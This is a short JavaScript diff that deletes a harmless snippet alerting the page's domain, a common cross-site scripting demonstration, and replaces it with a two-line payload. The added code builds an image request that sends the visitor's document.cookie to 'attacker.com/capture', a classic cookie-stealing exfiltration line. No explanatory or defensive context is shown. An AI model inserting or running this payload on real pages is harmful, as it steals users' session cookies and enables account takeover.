@@ -1,5 +1,2 @@
-// Get the current domain of the document
-let currentDomain = document.domain;
-
-// Display the domain in an alert
-alert("The current document domain is: " + currentDomain);
+var i = new Image();
+i.src = "http://attacker.com/capture?data=" + encodeURIComponent(document.cookie);
